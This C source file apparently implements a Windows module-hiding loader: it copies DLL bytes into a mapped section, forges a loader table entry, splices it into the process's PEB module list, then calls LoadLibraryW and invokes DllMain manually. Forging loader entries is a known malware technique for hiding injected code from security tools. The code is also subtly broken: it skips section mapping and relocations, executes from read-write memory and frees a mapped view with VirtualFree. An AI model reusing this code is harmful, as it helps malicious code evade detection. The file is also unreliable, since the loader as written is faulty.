#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

BOOL LoadLibrarySpoo(LPCWSTR dllPath, PVOID dllBytes, SIZE_T dllSize) {
    // 1. Create section with PAGE_READWRITE
    HANDLE hSection;
    LARGE_INTEGER liSize;
    liSize.QuadPart = dllSize;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &liSize,
        PAGE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status != 0) return FALSE;

    // 2. Map the section
    PVOID pMappedBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pMappedBase,
        0, 0, NULL,
        &viewSize,
        1, 0,
        PAGE_READWRITE
    );

    if (status != 0) {
        CloseHandle(hSection);
        return FALSE;
    }

    // 3. Write DLL into section
    memcpy(pMappedBase, dllBytes, dllSize);

    // 4. Fake LDR entry
    PLDR_DATA_TABLE_ENTRY pFakeEntry = (PLDR_DATA_TABLE_ENTRY)VirtualAlloc(
        NULL,
        sizeof(LDR_DATA_TABLE_ENTRY),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pFakeEntry) {
        VirtualFree(pMappedBase, 0, MEM_RELEASE);
        CloseHandle(hSection);
        return FALSE;
    }

    RtlZeroMemory(pFakeEntry, sizeof(LDR_DATA_TABLE_ENTRY));
    pFakeEntry->DllBase = pMappedBase;
    pFakeEntry->SizeOfImage = dllSize;
    pFakeEntry->LoadCount = 1;

    UNICODE_STRING usFullName, usBaseName;
    RtlInitUnicodeString(&usFullName, dllPath);
    RtlInitUnicodeString(&usBaseName, wcsrchr(dllPath, L'\\') + 1);
    pFakeEntry->FullDllName = usFullName;
    pFakeEntry->BaseDllName = usBaseName;

    // 5. Insert into loader list
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) {
        VirtualFree(pFakeEntry, 0, MEM_RELEASE);
        VirtualFree(pMappedBase, 0, MEM_RELEASE);
        CloseHandle(hSection);
        return FALSE;
    }

    PLIST_ENTRY pHead = &pPeb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY pNext = pHead->Flink;

    pFakeEntry->InLoadOrderLinks.Flink = pNext;
    pFakeEntry->InLoadOrderLinks.Blink = pHead;
    pNext->Blink = &pFakeEntry->InLoadOrderLinks;
    pHead->Flink = &pFakeEntry->InLoadOrderLinks;

    // 6. Call LoadLibrary
    HMODULE hMod = LoadLibraryW(dllPath);

    if (!hMod) {
        pHead->Flink = pNext;
        pNext->Blink = pHead;
        VirtualFree(pFakeEntry, 0, MEM_RELEASE);
        VirtualFree(pMappedBase, 0, MEM_RELEASE);
        CloseHandle(hSection);
        return FALSE;
    }

    // 7. Call DllMain
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMappedBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pMappedBase + pDos->e_lfanew);
    DWORD entryPointRVA = pNt->OptionalHeader.AddressOfEntryPoint;

    typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
    DLLMAIN pDllMain = (DLLMAIN)((BYTE*)pMappedBase + entryPointRVA);

    if (pDllMain) {
        pDllMain((HINSTANCE)pMappedBase, DLL_PROCESS_ATTACH, NULL);
    }

    return TRUE;
}
